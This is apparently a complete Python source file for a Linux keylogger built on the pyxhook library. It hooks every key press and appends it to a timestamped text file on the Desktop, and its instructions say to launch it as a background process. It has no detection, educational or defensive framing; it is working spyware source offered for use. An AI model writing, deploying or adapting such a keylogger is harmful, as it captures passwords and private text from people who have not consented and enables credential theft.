#!usr/bin/env python
"""
Description: A Simple Keylogger for GNU Linux using pyxhook library.

Instructions: Launch the program like so " python3 keylog.py & " for best results. Do not forget your assigned PID 
incase you need to kill thr script.

CopyRight: getFucktCasual__
"""    
import sys                                                  ###############################
import time as t                                            #     Importing Libraries     #
import getpass as g                                         ###############################
import pyxhook as px

def naming():
    """
    Name:           naming()
    Description:    Function is responsible for assigning a name to the log file in the following format.
                    username[HH-MM-SS].txt
    Parameters:     none
    """
    username = g.getuser()
    name = t.strftime("%H-%M-%S")
    key_dump = '~/Desktop/'+username+'['+name+']'+'.txt'
    return key_dump

NoF = naming()

def trigger(button):
    """
    Name:           trigger()
    Description:    Call function when a button is pressed.
    Parameters:     button (The button pressed)
    """
    log = open(NoF, 'a')
    if button.Ascii == 32:
        log.write(" ")
    elif button.Key == 'Shift_L':
        log.write("Shift_L")
    elif button.Key == 'Caps_Lock':
        log.write("Caps_Lock=")
    elif button.Key == 'Tab':
        log.write("Tab=")
    elif button.Key == 'Control_L':
        log.write("Control_L=")
    elif button.Key == 'Alt_L':
        log.write("Alt_L=")
    elif button.Key == 'comma':
        log.write(",")
    elif button.Key == 'period':
        log.write(".")
    elif button.Key == 'slash':
        log.write("/")
    elif button.Key == 'Shift_Lgreater':
        log.write("<")
    elif button.Key == 'Shift_Lless':
        log.write(">")
    elif button.Key == 'Return':
        log.write("\n")
    elif button.Key == 'BackSpace':
        log.write("<>")
    elif button.Key == 'minus':
        log.write("-")
    elif button.Key == 'Shift_Lplus':
        log.write("+")
    elif button.Key == 'equal':
        log.write("=")
    else:
        log.write(button.Key)
    
    if button.Ascii == 126:
        log.close()
        cycle = True
        start_hook.cancel()

if __name__ == '__main__':
    """
    Name:           none
    Description:    Execute the program.
    Parameters:     none
    """
    sys.path.insert(0, 'Assets/pyxhook.py')
    start_hook=px.HookManager()
    start_hook.KeyDown = trigger
    start_hook.HookKeyboard()
    start_hook.start()
